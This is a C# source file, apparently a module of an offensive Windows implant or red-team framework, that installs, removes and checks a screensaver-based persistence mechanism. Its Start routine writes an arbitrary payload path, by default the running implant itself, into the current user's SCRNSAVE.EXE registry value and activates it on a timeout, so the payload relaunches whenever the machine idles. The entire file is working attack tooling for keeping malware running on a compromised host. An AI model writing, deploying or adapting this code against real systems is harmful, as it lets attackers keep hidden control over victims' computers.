using System;
using Microsoft.Win32;

namespace Framework.Modules
{
    public static class Worker
    {
        private const string RegPath = @"Control Panel\Desktop";
        private const string ScrnSaveExe = "SCRNSAVE.EXE";
        private const string ScrnSaveActive = "ScreenSaveActive";
        private const string ScrnSaveTimeout = "ScreenSaveTimeOut";

        private static string GetDefaultPayloadPath()
        {
            try
            {
                return System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            }
            catch
            {
                return @"C:\Windows\System32\notepad.exe";
            }
        }

        public static string Info(string[] args)
        {
            string defaultPayload = GetDefaultPayloadPath();
            string defaultTimeout = "60";

            return $"[i] Default Start Command Parameters:\n" +
                   $"    R2 scr Start {defaultPayload} {defaultTimeout}";
        }

        public static string Start(string[] args)
        {
            string payloadPath = (args != null &&
                                  args.Length > 0 &&
                                  !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : GetDefaultPayloadPath();

            string timeout = (args != null &&
                              args.Length > 1 &&
                              !string.IsNullOrWhiteSpace(args[1]))
                ? args[1]
                : "60";

            try
            {
                using var regKey =
                    Registry.CurrentUser.OpenSubKey(RegPath, writable: true);

                if (regKey == null)
                    return "[-] Failed to open Control Panel\\Desktop registry key.";

                var existing = regKey.GetValue(ScrnSaveExe);

                if (existing != null)
                    return $"[*] Screensaver already set to '{existing}'.";

                regKey.SetValue(ScrnSaveExe, payloadPath);
                regKey.SetValue(ScrnSaveActive, "1");
                regKey.SetValue(ScrnSaveTimeout, timeout);

                return $"[+] Installed screensaver payload '{payloadPath}' " +
                       $"with timeout {timeout}s.";
            }
            catch (Exception ex)
            {
                return $"[-] Unexpected error during installation: {ex.Message}";
            }
        }

        public static string Stop(string[] args)
        {
            try
            {
                using var regKey =
                    Registry.CurrentUser.OpenSubKey(RegPath, writable: true);

                if (regKey == null)
                    return "[-] Failed to open Control Panel\\Desktop registry key.";

                var existing = regKey.GetValue(ScrnSaveExe);

                if (existing == null)
                    return "[*] No screensaver payload set.";

                regKey.DeleteValue(ScrnSaveExe);
                regKey.SetValue(ScrnSaveActive, "0");

                return "[+] Removed screensaver payload and disabled screensaver.";
            }
            catch (Exception ex)
            {
                return $"[-] Unexpected error during removal: {ex.Message}";
            }
        }

        public static string Check(string[] args)
        {
            try
            {
                using var regKey =
                    Registry.CurrentUser.OpenSubKey(RegPath, writable: false);

                if (regKey == null)
                    return "[-] Failed to open Control Panel\\Desktop registry key.";

                var value = regKey.GetValue(ScrnSaveExe)?.ToString();
                var active = regKey.GetValue(ScrnSaveActive)?.ToString();
                var timeout = regKey.GetValue(ScrnSaveTimeout)?.ToString();

                if (value == null)
                    return "[*] No screensaver payload set.";

                return $"[+] Verified screensaver payload '{value}' | " +
                       $"Active: {active} | Timeout: {timeout}s";
            }
            catch (Exception ex)
            {
                return $"[-] Unexpected error during verification: {ex.Message}";
            }
        }
    }
}